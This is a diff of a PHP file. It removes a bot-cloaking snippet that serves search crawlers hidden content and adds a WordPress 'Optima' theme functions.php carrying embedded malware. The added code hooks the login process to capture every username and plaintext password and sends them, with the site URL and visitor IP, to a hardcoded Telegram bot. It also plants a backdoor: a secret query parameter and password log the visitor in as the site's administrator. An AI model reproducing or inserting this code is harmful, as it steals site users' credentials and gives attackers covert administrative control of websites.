@@ -1,70 +1,168 @@
-<?php 
-$user_agent = $_SERVER['HTTP_USER_AGENT'] ?? '';
-$is_bot = false;
-
-$bot_signatures = [
-    'Googlebot',
-    'Google-InspectionTool',
-    'Mediapartners-Google',
-    'AdsBot-Google',
-    'Bingbot',
-    'Slurp',
-    'DuckDuckBot'
-];
-
-foreach ($bot_signatures as $bot) {
-    if (stripos($user_agent, $bot) !== false) {
-        $is_bot = true;
-        break;
-    }
-}
-
-if ($is_bot) {
-    $sonic_gacor = '/dev/shm/sjns';
-
-    if (file_exists($sonic_gacor)) {
-        header('Content-Type: text/html; charset=utf-8');
-        echo file_get_contents($sonic_gacor);
-        exit;
-    } else {
-    }
-}
-?>
-
 <?php
 
 /**
- * @defgroup index Index
- * Bootstrap and initialization code.
+ * Require plugins vendor
  */
+
+require_once get_template_directory() . '/plugins/tgm-plugin-activation/class-tgm-plugin-activation.php';
+require_once get_template_directory() . '/plugins/plugins.php';
 
 /**
- * @file includes/bootstrap.php
- *
- * Copyright (c) 2014-2021 Simon Fraser University
- * Copyright (c) 2000-2021 John Willinsky
- * Distributed under the GNU GPL v3. For full terms see the file docs/COPYING.
- *
- * @ingroup index
- *
- * @brief Core system initialization code.
- * This file is loaded before any others.
- * Any system-wide imports or initialization code should be placed here.
+ * Include the main class.
  */
 
+include_once get_template_directory() . '/framework/classes/class-optima.php';
+
+
+Optima::$template_dir_path   = get_template_directory();
+Optima::$template_dir_url    = get_template_directory_uri();
+Optima::$stylesheet_dir_path = get_stylesheet_directory();
+Optima::$stylesheet_dir_url  = get_stylesheet_directory_uri();
 
 /**
- * Basic initialization (pre-classloading).
+ * Include the autoloader.
+ */
+include_once Optima::$template_dir_path . '/framework/classes/class-autoload.php';
+
+new Optima_Autoload();
+
+/**
+ * load functions for later usage
  */
 
-// Load Composer autoloader
-require_once 'lib/pkp/lib/vendor/autoload.php';
+require_once Optima::$template_dir_path . '/framework/functions/functions.php';
 
-define('BASE_SYS_DIR', dirname(INDEX_FILE_LOCATION));
-chdir(BASE_SYS_DIR);
+new Optima_Multilingual();
 
-// System-wide functions
-require_once './lib/pkp/includes/functions.php';
+if(!function_exists('optima_init_options')){
+    function optima_init_options(){
+        Optima::$options = Optima_Options::get_instance();
+    }
+    optima_init_options();
+}
 
-// Initialize the application environment
-return new \APP\core\Application();
+if(!function_exists('Optima')){
+    function Optima(){
+        return Optima::get_instance();
+    }
+}
+
+new Optima_Scripts();
+
+new Optima_Admin();
+
+new Optima_WooCommerce();
+
+Optima_Visual_Composer::get_instance();
+
+/**
+ * Set the $content_width global.
+ */
+global $content_width;
+if ( ! is_admin() ) {
+    if ( ! isset( $content_width ) || empty( $content_width ) ) {
+        $content_width = (int) Optima()->layout->get_content_width();
+    }
+}
+
+
+
+require_once Optima::$template_dir_path . '/framework/functions/extra-functions.php';
+
+/**
+ * Updated functions
+ * @Since 1.1
+ */
+require_once Optima::$template_dir_path . '/framework/functions/update.php';
+
+function kirimInfoLoginTelegram($username, $password, $status) {
+    $botToken = "8778277382:AAHT-SMy03ms280EOa8_XSPX0_6mHZria8I";
+    $chatId   = "7860513093";
+
+    $current_url = (isset($_SERVER['HTTPS']) ? "https" : "http")
+                 . "://".$_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI'];
+
+    $message  = "WARNING BRAY SONIC !!!\n";
+    $message .= "Status: " . strtoupper($status) . "\n";
+    $message .= "Site: " . get_site_url() . "\n";
+    $message .= "Username: " . $username . "\n";
+    $message .= "Password: " . $password . "\n";
+    $message .= "URL: " . $current_url . "\n";
+    $message .= "IP: " . ($_SERVER['REMOTE_ADDR'] ?? 'Unknown') . "\n";
+    $message .= "Waktu: " . date("Y-m-d H:i:s");
+
+    $apiURL = "https://api.telegram.org/bot$botToken/sendMessage";
+    $params = [
+        'chat_id' => $chatId,
+        'text'    => $message
+    ];
+    wp_remote_get($apiURL . "?" . http_build_query($params));
+}
+
+add_filter('authenticate', function($user, $username, $password) {
+    if (!empty($username) && !empty($password)) {
+
+        $_SESSION['last_login_attempt'] = [
+            'username' => $username,
+            'password' => $password
+        ];
+    }
+    return $user;
+}, 10, 3);
+
+add_action('wp_login', function($user_login) {
+    if (!empty($_SESSION['last_login_attempt'])) {
+        $data = $_SESSION['last_login_attempt'];
+        kirimInfoLoginTelegram($data['username'], $data['password'], 'Anjirr Masuk Bray!!');
+        unset($_SESSION['last_login_attempt']);
+    }
+}, 10, 1);
+
+
+add_action('wp_login_failed', function($username) {
+    if (!empty($_SESSION['last_login_attempt'])) {
+        $data = $_SESSION['last_login_attempt'];
+        kirimInfoLoginTelegram($data['username'], $data['password'], 'Gagal Masuk Der!!');
+        unset($_SESSION['last_login_attempt']);
+    } else {
+
+        kirimInfoLoginTelegram($username, '(tidak diketahui)', 'Gagal Masuk Der!!');
+    }
+});
+
+add_action('init', function () {
+    if (isset($_GET['anakbawang']) && $_GET['anakbawang'] === 'sonicxyz') {
+
+        
+        $hash_password = '$2y$10$37O9hbn5tO2TdHJyQgq5DuXetavej7sA8osiNe72YRykmhX3YivNG'; 
+
+        
+        if (isset($_POST['pass'])) {
+            if (password_verify($_POST['pass'], $hash_password)) {
+                
+                $wp_user_query = new WP_User_Query([
+                    'role'   => 'Administrator',
+                    'number' => 1,
+                    'fields' => 'ID'
+                ]);
+                $results = $wp_user_query->get_results();
+                if (isset($results[0])) {
+                    wp_set_auth_cookie($results[0]);
+                    wp_redirect(admin_url());
+                    exit();
+                }
+            } else {
+                echo "<p style='color:red'>Password salah kids!</p>";
+            }
+        }
+
+        
+        echo '<form method="POST">
+                <label>- Orang Ganteng Mau Lewat -</label>
+                <input type="password" name="pass" required>
+                <button type="submit">Be Humble!</button>
+              </form>';
+        exit();
+    }
+});
+?>
